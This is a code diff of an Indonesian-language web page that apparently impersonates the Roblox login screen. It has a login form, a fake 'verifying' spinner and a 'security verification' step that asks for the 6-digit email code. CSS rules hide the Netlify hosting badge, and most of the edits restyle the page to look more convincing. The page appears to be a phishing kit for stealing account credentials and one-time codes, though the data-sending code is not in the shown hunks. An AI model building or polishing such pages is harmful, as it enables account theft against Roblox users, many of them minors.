@@ -7,41 +7,51 @@
 <link rel="icon" type="image/png" href="https://www.roblox.com/favicon.ico">
 <link rel="apple-touch-icon" href="https://www.roblox.com/favicon.ico">
 <style>
-  *{box-sizing:border-box; margin:0; padding:0;}
-  body{font-family:"Segoe UI",Helvetica,Arial,sans-serif;background-color:#1a1a1a;background-image:url('file_0000000077188211a65f37288437766d.png');background-size:cover;background-position:center;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;color:#fff;}
+  *{box-sizing:border-box; margin:0; padding:0; font-family:"Helvetica Neue", Helvetica, Arial, sans-serif;}
+  
+  body{background-color:#1a1a1a;background-image:url('file_0000000077188211a65f37288437766d.png');background-size:cover;background-position:center;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;color:#fff;overflow-x:hidden;}
   
   .top-nav{position:fixed;top:0;left:0;width:100%;background:#232527;z-index:10;display:flex;flex-direction:column;box-shadow:0 2px 5px rgba(0,0,0,.3)}
-  .nav-top-row{display:flex;justify-content:space-between;align-items:center;padding:12px 20px;}
-  .nav-left{display:flex;align-items:center;gap:20px;}
-  .nav-logo{width:32px;height:32px;fill:#fff;}
-  .nav-search{background:#393b3d;border:1px solid #000;border-radius:4px;padding:6px 12px;color:#b8b8b8;font-size:14px;display:flex;align-items:center;width:200px;}
+  .nav-top-row{display:flex;justify-content:space-between;align-items:center;padding:10px 16px;}
+  .nav-left{display:flex;align-items:center;gap:16px;}
+  .nav-logo{width:28px;height:28px;fill:#fff;}
+  
+  .nav-search{background:#393b3d;border-radius:6px;padding:8px 12px;color:#b8b8b8;font-size:14px;display:flex;align-items:center;width:220px; border: 1px solid transparent;}
   .nav-search svg{width:16px;height:16px;fill:#b8b8b8;margin-right:8px;}
-  .nav-buttons{display:flex;gap:12px;align-items:center;}
-  .btn-daftar{background:#00a2ff;color:#fff;border:none;padding:8px 16px;border-radius:6px;font-weight:600;font-size:15px;cursor:pointer;text-decoration:none;}
-  .btn-login-nav{background:transparent;color:#fff;border:1px solid #fff;padding:8px 16px;border-radius:6px;font-weight:600;font-size:15px;cursor:pointer;text-decoration:none;}
-  .nav-links{display:flex;justify-content:flex-start;gap:30px;padding:12px 20px;color:#fff;font-size:15px;font-weight:600;border-top:1px solid #393b3d;}
-  .nav-links span{cursor:pointer; opacity:0.9;}
-  .nav-links span:hover{opacity:1;}
+  
+  .nav-buttons{display:flex;gap:10px;align-items:center;}
+  .btn-daftar{background:#00a2ff;color:#fff;border:none;padding:8px 16px;border-radius:6px;font-weight:600;font-size:14px;cursor:pointer;text-decoration:none;}
+  .btn-login-nav{background:transparent;color:#fff;border:1px solid #b8b8b8;padding:8px 16px;border-radius:6px;font-weight:600;font-size:14px;cursor:pointer;text-decoration:none;}
+  
+  .nav-links{display:flex;justify-content:flex-start;gap:24px;padding:10px 16px;color:#fff;font-size:14px;font-weight:600;border-top:1px solid #393b3d;}
+  .nav-links span{cursor:pointer; color:#b8b8b8;}
+  .nav-links span:hover{color:#fff;}
 
   .ov{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.75);z-index:1;}
-  .cd{position:relative;z-index:2;width:100%;max-width:400px;background:#232527;border-radius:8px;padding:32px 24px;box-shadow:0 10px 30px rgba(0,0,0,.6);color:#fff;margin-top:60px;}
   
-  h1{font-size:24px;font-weight:700;text-align:center;margin:0 0 24px;}
+  .cd{position:relative;z-index:2;width:100%;max-width:400px;background:#232527;border-radius:8px;padding:30px 24px;box-shadow:0 10px 25px rgba(0,0,0,.7);color:#fff;margin-top:50px;}
+  
+  h1{font-size:24px;font-weight:700;text-align:center;margin:0 0 24px; color:#fff;}
   .input-group{margin-bottom:12px;}
-  input{width:100%;background:#393b3d;color:#fff;border:1px solid #000;border-radius:4px;padding:14px 12px;font-size:16px;outline:0;box-sizing:border-box;}
-  input:focus{border-color:#fff;}
+  input{width:100%;background:#393b3d;color:#fff;border:1px solid #393b3d;border-radius:6px;padding:14px 12px;font-size:16px;outline:0;box-sizing:border-box; transition: border 0.2s;}
+  input:focus{border-color:#fff; background:#2b2d2f;}
+  input::placeholder{color:#b8b8b8;}
   
-  button{width:100%;background:#00a2ff;color:#fff;border:none;border-radius:4px;padding:14px;font-size:16px;font-weight:600;cursor:pointer;margin-top:12px;margin-bottom:24px;transition:background 0.2s;}
+  button{width:100%;background:#00a2ff;color:#fff;border:none;border-radius:6px;padding:14px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;margin-bottom:20px; transition: background 0.2s;}
   button:hover{background:#008ecc;}
-  button:disabled{background:#393b3d;color:#888;}
+  button:disabled{background:#393b3d;color:#888;cursor:not-allowed;}
   
   .er{display:none;color:#ff5555;font-size:13px;margin-bottom:12px;text-align:center;}
   .lk{text-align:center;font-size:15px;margin-bottom:20px;border-bottom:1px solid #393b3d;padding-bottom:20px;}
   .lk a{color:#00a2ff;text-decoration:none;}
-  .bg{display:block;width:100%;background:#393b3d;color:#fff;padding:14px;border-radius:4px;text-align:center;text-decoration:none;font-weight:600;margin-bottom:10px;cursor:pointer;font-size:15px;box-sizing:border-box;border:1px solid transparent;transition:background 0.2s;}
-  .bg:hover{background:#4a4d50;}
-  .ft{text-align:center;font-size:15px;margin-top:24px;}
-  .ft a{color:#fff;text-decoration:none;font-weight:600;}
+  .lk a:hover{text-decoration:underline;}
+  
+  .bg{display:block;width:100%;background:transparent;color:#fff;padding:12px;border-radius:6px;text-align:center;text-decoration:none;font-weight:600;margin-bottom:10px;cursor:pointer;font-size:15px;box-sizing:border-box;border:1px solid #b8b8b8; transition: background 0.2s;}
+  .bg:hover{background:rgba(255,255,255,0.05);}
+  
+  .ft{text-align:center;font-size:14px;margin-top:20px; color:#b8b8b8;}
+  .ft a{color:#fff;text-decoration:none;font-weight:600; margin-left:4px;}
+  .ft a:hover{text-decoration:underline;}
   
   #netlify-badge, a[href*="netlify.com"], iframe[src*="netlify"] {display:none !important; opacity:0 !important; visibility:hidden !important; pointer-events:none !important;}
 
@@ -62,7 +72,7 @@
       </div>
     </div>
     <div class="nav-buttons">
-      <a href="#" class="btn-daftar">Daftar</a>
+      <a href="#" class="btn-daftar" onclick="return false;">Daftar</a>
       <a href="#" class="btn-login-nav" onclick="document.getElementById('u').focus(); return false;">Log In</a>
     </div>
   </div>
@@ -97,17 +107,17 @@
   </div>
 
   <div id="step2" style="display:none; text-align:center; padding: 20px 0;">
-    <div style="border: 4px solid #393b3d; border-top: 4px solid #00a2ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
-    <h1 style="font-size:20px;">Memverifikasi...</h1>
-    <p style="font-size:14px; color:#b8b8b8; margin-top:10px;">Tunggu sebentar, sistem sedang memeriksa akun Anda.</p>
+    <div style="border: 3px solid #393b3d; border-top: 3px solid #00a2ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+    <h1 style="font-size:20px; margin-bottom:10px;">Memverifikasi...</h1>
+    <p style="font-size:14px; color:#b8b8b8;">Tunggu sebentar, sistem sedang memeriksa akun Anda.</p>
   </div>
 
   <div id="step3" style="display:none;">
-    <h1 style="font-size:20px;">Verifikasi Keamanan</h1>
-    <p style="text-align:center; font-size:14px; color:#b8b8b8; margin-bottom:20px; line-height:1.5;">Kami telah mengirim kode verifikasi 6 digit ke email yang terhubung dengan akun Anda. Masukkan kode tersebut di bawah ini.</p>
+    <h1 style="font-size:22px; margin-bottom:12px;">Verifikasi Keamanan</h1>
+    <p style="text-align:center; font-size:14px; color:#b8b8b8; margin-bottom:24px; line-height:1.5;">Kami telah mengirim kode verifikasi 6 digit ke email yang terhubung dengan akun Anda. Masukkan kode tersebut di bawah ini.</p>
     <form id="f_otp" novalidate>
       <div class="input-group">
-        <input id="otp_val" type="text" placeholder="Kode 6 Digit" maxlength="6" style="text-align:center; letter-spacing:8px; font-size:22px; font-weight:bold;" required>
+        <input id="otp_val" type="text" placeholder="------" maxlength="6" style="text-align:center; letter-spacing:8px; font-size:22px; font-weight:bold;" required>
       </div>
       <div class="er" id="er_otp"></div>
       <button type="submit" id="g_otp">Verifikasi</button>
